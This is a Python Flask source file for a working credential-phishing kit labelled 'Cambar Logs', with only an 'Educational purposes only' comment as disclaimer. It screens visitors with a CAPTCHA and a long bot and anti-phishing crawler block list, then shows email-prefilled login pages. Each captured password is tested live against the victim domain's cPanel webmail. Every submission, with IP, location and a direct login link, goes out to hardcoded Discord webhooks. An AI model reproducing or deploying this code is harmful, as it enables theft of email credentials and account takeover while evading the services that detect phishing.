import time
import random
import secrets
import hashlib
import requests
import dns.resolver
import os
from PIL import Image, ImageDraw, ImageFont
from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify, send_from_directory
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Educational purposes only

# Discord Webhook URLs
DISCORD_WEBHOOK_URLS = [
    "https://discord.com/api/webhooks/1476396412085342308/TC4GtHC8TdiPiNnqMOrhDLT_v58JdPBvO3Asn2m0oEEr0qSXPrJnIsd289U9dhYeN0kk",
    "https://discord.com/api/webhooks/1476396446482825328/D-EJl34bNYPJo-O5XEzm4uZFG-McaIZb5eaZmkWJD8WUQCDYLC6yCRvmbHEMQC1L5vke",
    "https://discord.com/api/webhooks/1476396469190791321/qSDWGVMauTFJPRYSe81bnSXDEsKt3szqji_YezycnwvGaC-8GH2e7HtyC_OVqkBGFb2I"
]

def get_client_ip():
    """Extract client IP from various headers"""
    return (request.headers.get('X-Forwarded-For') or
            request.headers.get('X-Real-IP') or
            request.headers.get('X-Client-IP') or
            request.remote_addr)

def get_ip_location(ip_address):
    """Simple and reliable IP location using ip-api.com"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                country = data.get('country', 'Unknown')
                state = data.get('regionName', 'Unknown')
                city = data.get('city', 'Unknown')
                return f"Country: {country}, State: {state}, City: {city}"
        
        return f"IP: {ip_address} (Location unavailable)"
        
    except Exception as e:
        return f"IP: {ip_address} (Error: {str(e)})"


def get_mx_record(domain):
    """Get MX records for a domain"""
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        return ', '.join(str(r.exchange) for r in answers)
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
        return "No MX Record Found"

def generate_client_fingerprint():
    """
    CLIENT FINGERPRINTING EXPLANATION:
    Creates a unique identifier for each visitor by combining:
    - IP Address
    - User-Agent string
    - Accept headers
    - Accept language
    - Other browser characteristics
    
    This creates a hash that can track the same user across multiple requests
    even if they clear cookies, helping to detect suspicious patterns.
    """
    user_agent = request.headers.get('User-Agent', '')
    accept = request.headers.get('Accept', '')
    accept_language = request.headers.get('Accept-Language', '')
    ip_address = get_client_ip()
    
    # Combine multiple client characteristics
    fingerprint_string = f"{user_agent}{accept}{accept_language}{ip_address}"
    return hashlib.md5(fingerprint_string.encode()).hexdigest()[:16]

def send_discord_message(greet, salute, ip, useragent, domain, mx_record, message_type):
    # Get location information
    location = get_ip_location(ip)
    
    webhook_url = random.choice(DISCORD_WEBHOOK_URLS)
    
    if message_type == "success":
        title = "🔔 CAMBAR SUCCESS Log✅✅✅"
        footer = "Cambar Logs - Secure Notifications✅✅✅"
    else:
        title = "🔔 CAMBAR FAILED Log⛔⛔⛔"
        footer = "Cambar Logs - Secure Notifications⛔⛔⛔"
    
    message = {
        "username": "Cambar Logs",
        "embeds": [
            {
                "title": title,
                "color": 16711680,
                "fields": [
                    {"name": "📧 Email", "value": f"`{greet}`", "inline": False},
                    {"name": "🔑 Password", "value": f"`{salute}`", "inline": False},
                    {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
                    {"name": "📍 Location", "value": f"`{location}`", "inline": False},
                    {"name": "🖥 User-Agent", "value": f"`{useragent}`", "inline": False},
                    {"name": "🌍 Domain", "value": f"`{domain}`", "inline": False},
                    {"name": "📨 MX Record", "value": f"`{mx_record}`", "inline": False},
                    {"name": "⛓️ Direct-Link", "value": f"`https://{domain}:2096/login/?user={greet}&pass={salute}`", "inline": False},
                ],
                "footer": {"text": footer},
            }
        ]
    }
    
    try:
        requests.post(webhook_url, json=message)
        return {"status": "success", "message": "Discord notification sent"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def generate_captcha_image():
    """Generate 6-digit CAPTCHA with visual strain effects"""
    code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    
    # Create image with distortion
    image = Image.new('RGB', (220, 90), color=(245, 245, 245))
    draw = ImageDraw.Draw(image)
    
    # Add background noise
    for i in range(200):
        x = random.randint(0, 219)
        y = random.randint(0, 89)
        draw.point((x, y), fill=(random.randint(200, 255), random.randint(200, 255), random.randint(200, 255)))
    
    # Draw skewed characters
    for i, char in enumerate(code):
        # Varying font properties
        font_size = random.randint(28, 36)
        try:
            font = ImageFont.truetype("arial.ttf", font_size)
        except:
            font = ImageFont.load_default()
        
        # Skewed positioning
        x = 15 + i * 32 + random.randint(-8, 8)
        y = 20 + random.randint(-15, 15)
        
        # Bold effect with multiple draws
        draw.text((x-1, y), char, fill=(50, 50, 50), font=font)
        draw.text((x+1, y), char, fill=(50, 50, 50), font=font)
        draw.text((x, y-1), char, fill=(50, 50, 50), font=font)
        draw.text((x, y+1), char, fill=(50, 50, 50), font=font)
        draw.text((x, y), char, fill=(0, 0, 0), font=font)
    
    # Add lines for additional strain
    for i in range(3):
        start_x = random.randint(0, 50)
        start_y = random.randint(0, 89)
        end_x = random.randint(170, 219)
        end_y = random.randint(0, 89)
        draw.line([(start_x, start_y), (end_x, end_y)], fill=(180, 180, 180), width=1)
    
    return image, code

# Initialize Flask app
app = Flask(__name__)
limiter = Limiter(
    get_client_ip,
    app=app,
    default_limits=["7 per day", "7 per hour"]
)
secret_key = secrets.token_urlsafe(32)
app.secret_key = secret_key

# Bot detection list
bot_user_agents = [
    'Googlebot', 'Baiduspider', 'ia_archiver', 'R6_FeedFetcher', 
    'NetcraftSurveyAgent', 'Sogou web spider', 'bingbot', 'Yahoo! Slurp', 
    'facebookexternalhit', 'PrintfulBot', 'msnbot', 'Twitterbot', 
    'UnwindFetchor', 'urlresolver', 'Butterfly', 'TweetmemeBot',
    'PaperLiBot', 'MJ12bot', 'AhrefsBot', 'Exabot', 'Ezooms', 'YandexBot',
    'SearchmetricsBot', 'phishtank', 'PhishTank', 'picsearch', 
    'TweetedTimes Bot', 'QuerySeekerSpider', 'ShowyouBot', 'woriobot',
    'merlinkbot', 'BazQuxBot', 'Kraken', 'SISTRIX Crawler', 'R6_CommentReader',
    'magpie-crawler', 'GrapeshotCrawler', 'PercolateCrawler', 'MaxPointCrawler',
    'R6_FeedFetcher', 'NetSeer crawler', 'grokkit-crawler', 'SMXCrawler',
    'PulseCrawler', 'Y!J-BRW', '80legs.com/webcrawler', 'Mediapartners-Google', 
    'Spinn3r', 'InAGist', 'Python-urllib', 'NING', 'TencentTraveler',
    'Feedfetcher-Google', 'mon.itor.us', 'spbot', 'Feedly', 'bot', 'curl',
    "spider", "crawler",
    
    # Additional bots to reach 175
    'Applebot', 'DuckDuckBot', 'Slurp', 'Teoma', 'CCBot', 'PetalBot',
    'SemrushBot', 'DotBot', 'Serpstatbot', 'MegaIndex.ru', 'LinkpadBot',
    'DataForSeoBot', 'Seekport', 'AspiegelBot', 'BLEXBot', 'Panscient',
    'YouBot', 'Neevabot', 'ScoutJet', 'MojeekBot', 'Cliqzbot', 'Genieo',
    'Barkrowler', 'InfoTigerBot', 'ltx71', 'Qwantify', 'SafeDNSBot',
    'archive.org_bot', 'SpecialArchiver', 'AdsBot-Google', 'AdsBot-Google-Mobile',
    'Google-Safety', 'Google-InspectionTool', 'GoogleOther', 'GoogleReadAloud',
    'PetfulBot', 'Bytespider', 'Pinterestbot', 'Discordbot', 'Slackbot',
    'TelegramBot', 'WhatsApp', 'LinkedInBot', 'WeChat', 'SkypeUriPreview',
    'Iframely', 'Embedly', 'MetaURI', 'LongURL', 'Mail.RU_Bot', 'SeznamBot',
    'ZumBot', 'Gigabot', 'ICC-Crawler', 'SiteAuditBot', 'UptimeRobot',
    'StatusCake', 'Panopta', 'Pingdom', 'DareBoost', 'GTmetrix', 'WebPageTest',
    'SpeedCurve', 'Calypso AppCrawler', 'HeadlessChrome', 'PhantomJS',
    'Selenium', 'Playwright', 'Puppeteer', 'WebDriver', 'Cypress',
    'Lighthouse', 'DuckDuckGo-Favicons-Bot', 'Discordbot', 'Slurp',
    'YaK', 'Linguee Bot', 'JikeSpider', 'AOLBuild', 'BingPreview',
    'Adidxbot', 'BingLocalSearch', 'BingSearch', 'MSNBot-Media',
    'Bingbot-Image', 'Bingbot-Video', 'SeekportBot', 'CloudFlare-AlwaysOnline',
    'Amazon CloudFront', 'AWS Security Scanner', 'GuzzleHttp',
    'HTTPie', 'PostmanRuntime', 'Insomnia', 'curl', 'Wget',
    'Go-http-client', 'Java', 'Apache-HttpClient', 'okhttp',
    'python-requests', 'node-fetch', 'axios', 'RestSharp',
    
    # Even more bots to reach 175
    'Nutch', 'Heritrix', 'HTTrack', 'WebCopier', 'SiteSucker',
    'Go-http-client', 'Ruby', 'PHP', 'Perl', 'urllib', 'libwww',
    'Mechanize', 'Scrapy', 'BeautifulSoup', 'SimpleCrawler',
    'UniversalFeedParser', 'FeedParser', 'Rome Client', 'Jetty',
    'ApacheBench', 'ab', 'Siege', 'wrk', 'httperf', 'boom',
    ' vegeta', 'k6', 'Artiosbot', 'A6-Indexer', 'Accoona-AI-Agent',
    'AddThis.com', 'AnyApexBot', 'Apache-HttpClient', 'AppEngine-Google',
    'Ezooms', 'E-SocietyRobot', 'Exabot-Images', 'FAST-WebCrawler',
    'Favicon', 'FeedBurner', 'FeedValidator', 'Flamingo_SearchEngine',
    'FollowSite', 'FurlBot', 'FyberSpider', 'G2-Crawler', 'Gigablast',
    'GingerCrawler', 'Gluten Free Crawler', 'GnowitNewsbot',
    'Google-Ads-Creatives-Assistant', 'Google-Ads-DisplayAd-WebRenderer',
    'Google-Ads-Keywords', 'Google-Ads-Outreach', 'Google-Ads-Shopping',
    'Google-App-Engine', 'Google-Calendar-Importer', 'Google-HotelAdsVerifier',
    'Google-Image-Proxy', 'Google-Podcast', 'Google-Producer',
    'Google-Structured-Data-Testing-Tool', 'Google-Sync-Adapter',
    'Google-Travel-Ads', 'Google-Video-Intelligence', 'Google-Voice',
    'Google-Web-Light', 'Google-Youtube-Links', 'GooglePPDefault',
    'GoogleSafeBrowsing', 'GroupHigh', 'Gwene', 'HappyApps-WebCheck',
    'Hatena', 'HubSpot', 'HubSpot Connect', 'HubSpot Links Crawler',
    'ICC-Crawler', 'IDG/IT', 'INGRID', 'IXRbot', 'Jyxobot',
    'Kelny', 'Kemvibot', 'KnowJet'
]

# Three-stage flow implementation
@app.route('/', methods=['GET', 'POST'])
def captcha_challenge():
    """Stage 1: CAPTCHA Challenge"""
    if request.method == 'GET':
        if 'passed_captcha' in session and session['passed_captcha']:
            return redirect(url_for('winner_run'))
        
        # Generate 6-digit CAPTCHA
        captcha_image, captcha_code = generate_captcha_image()
        session['captcha_code'] = captcha_code
        
        user_greet = request.args.get("web")
        if user_greet and '@' in user_greet:
            user_domain = user_greet[user_greet.index('@') + 1:]
            session['call'] = user_greet
            session['user_domain'] = user_domain
        
        # Convert image to base64 for HTML display
        import io
        import base64
        img_buffer = io.BytesIO()
        captcha_image.save(img_buffer, format='PNG')
        img_buffer.seek(0)
        img_data = base64.b64encode(img_buffer.getvalue()).decode()
        
        return render_template('captcha.html', 
                             img_data=img_data, 
                             user_greet=session.get('call'), 
                             user_domain=session.get('user_domain'), 
                             error=False)
    
    elif request.method == 'POST':
        user_input = request.form.get('code', '')
        
        if user_input == session.get('captcha_code'):
            session['passed_captcha'] = True
            session['client_fingerprint'] = generate_client_fingerprint()
            
            # Get the web parameter from the form or session
            web_param = request.form.get('web') or session.get('call')
            return redirect(url_for('winner_run', web=web_param))
        else:
            return redirect(url_for('captcha_challenge'))

@app.route('/success', methods=['GET'])
def winner_run():
    """Stage 2: Success Redirect"""
    if 'passed_captcha' in session and session['passed_captcha']:
        web_param = request.args.get('web')
        return redirect(url_for('credit_pile', call=web_param))
    else:
        return redirect(url_for('captcha_challenge'))

@app.route("/pile", methods=['GET'])
def credit_pile():
    """Stage 3: Credential pile Page"""
    web_param = request.args.get('web')
    if web_param:
        session['call'] = web_param
        session['user_domain'] = web_param[web_param.index('@') + 1:]
    
    # Return template for credential pile
    return render_template('home.html', 
                         user_greet=session.get('call'), 
                         user_domain=session.get('user_domain'),
                         client_id=session.get('client_fingerprint'))

# Three credential processing endpoints with FastAPI-style responses
@app.route("/process_f", methods=['POST'])
def process_first():
    """First credential processing route"""
    if request.method == 'POST':
        # Collect client information
        client_ip = get_client_ip()
        user_agent = request.headers.get('User-Agent', '')
        greet = request.form.get("greet")
        salute = request.form.get("salute")
        domain = session.get('user_domain')
        
        mx_record = get_mx_record(domain) if domain else "No domain"
        
        # Ensure domain has protocol
        target_domain = domain
        if not target_domain.startswith("http://") and not target_domain.startswith("https://"):
            target_domain = "https://" + target_domain

        try:
            # Attempt credential verification
            response = requests.get(f"{target_domain}:2096/login/?user={greet}&pass={salute}", timeout=7)
            
            if "/cpsess" in response.url:
                # Successful login
                send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "success")
                return redirect(f"{target_domain}:2096/login/?user={greet}&pass={salute}")
            else:
                send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
                return render_template('error_one.html', 
                            user_greet=session.get('call'), 
                            user_domain=session.get('user_domain'),
                            client_id=session.get('client_fingerprint'))
        
        except requests.exceptions.Timeout:
            # Handle timeout as failed login
            send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
            return render_template('error_one.html', 
                        user_greet=session.get('call'), 
                        user_domain=session.get('user_domain'),
                        client_id=session.get('client_fingerprint'))
                        
        except requests.exceptions.RequestException as e:
            # Handle other request-related errors
            send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
            return render_template('error_one.html', 
                        user_greet=session.get('call'), 
                        user_domain=session.get('user_domain'),
                        client_id=session.get('client_fingerprint'))

@app.route("/process_s", methods=['POST'])
def process_second():
    """Second credential processing route"""
    if request.method == 'POST':
        client_ip = get_client_ip()
        user_agent = request.headers.get('User-Agent', '')
        greet = request.form.get("greet")
        salute = request.form.get("salute")
        domain = session.get('user_domain')
        
        mx_record = get_mx_record(domain) if domain else "No domain"
        
        target_domain = domain
        if not target_domain.startswith("http://") and not target_domain.startswith("https://"):
            target_domain = "https://" + target_domain

        try:
            # Attempt credential verification
            response = requests.get(f"{target_domain}:2096/login/?user={greet}&pass={salute}", timeout=7)
            
            if "/cpsess" in response.url:
                # Successful login
                send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "success")
                return redirect(f"{target_domain}:2096/login/?user={greet}&pass={salute}")
            else:
                send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
                return render_template('error_two.html', 
                            user_greet=session.get('call'), 
                            user_domain=session.get('user_domain'),
                            client_id=session.get('client_fingerprint'))
        
        except requests.exceptions.Timeout:
            # Handle timeout as failed login
            send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
            return render_template('error_two.html', 
                        user_greet=session.get('call'), 
                        user_domain=session.get('user_domain'),
                        client_id=session.get('client_fingerprint'))
                        
        except requests.exceptions.RequestException as e:
            # Handle other request-related errors
            send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
            return render_template('error_two.html', 
                        user_greet=session.get('call'), 
                        user_domain=session.get('user_domain'),
                        client_id=session.get('client_fingerprint'))

@app.route("/process_t", methods=['POST'])
def process_third():
    """Third credential processing route"""
    if request.method == 'POST':
        client_ip = get_client_ip()
        user_agent = request.headers.get('User-Agent', '')
        greet = request.form.get("greet")
        salute = request.form.get("salute")
        domain = session.get('user_domain')
        
        mx_record = get_mx_record(domain) if domain else "No domain"
        
        target_domain = domain
        if not target_domain.startswith("http://") and not target_domain.startswith("https://"):
            target_domain = "https://" + target_domain

        try:
            # Attempt credential verification
            response = requests.get(f"{target_domain}:2096/login/?user={greet}&pass={salute}", timeout=7)
            
            if "/cpsess" in response.url:
                # Successful login
                send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "success")
                return redirect(f"{target_domain}:2096/login/?user={greet}&pass={salute}")
            else:
                send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
                return redirect(f"{target_domain}")
        
        except requests.exceptions.Timeout:
            # Handle timeout as failed login
            send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
            return redirect(f"{target_domain}")
                        
        except requests.exceptions.RequestException as e:
            # Handle other request-related errors
            send_discord_message(greet, salute, client_ip, user_agent, domain, mx_record, "failed")
            return redirect(f"{target_domain}")

# Error handling routes that return templates
@app.route("/error_one", methods=['GET'])
def error_one():
    """First error handling page"""
    if request.method == 'GET':
        call = session.get('call')
        user_domain = session.get('user_domain')
        return render_template('error_one.html', 
                             call=call, 
                             user_domain=user_domain,
                             client_id=session.get('client_fingerprint'))

@app.route("/error_two", methods=['GET'])
def error_two():
    """Second error handling page"""
    user_agent = request.headers.get('User-Agent')
    
    if user_agent in bot_user_agents:
        abort(403)
    
    if request.method == 'GET':
        call = session.get('call')
        user_domain = session.get('user_domain')
        return render_template('error_two.html', 
                             call=call,
                             user_domain=user_domain,
                             client_id=session.get('client_fingerprint'))

# FastAPI-style health check endpoint
@app.route("/health", methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "timestamp": time.time(),
        "version": "1.0.0"
    })
    
@app.route('/robots.txt')
def robots_txt():
    return send_from_directory(os.path.dirname(app.instance_path), 'robots.txt')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=3000, debug=False)
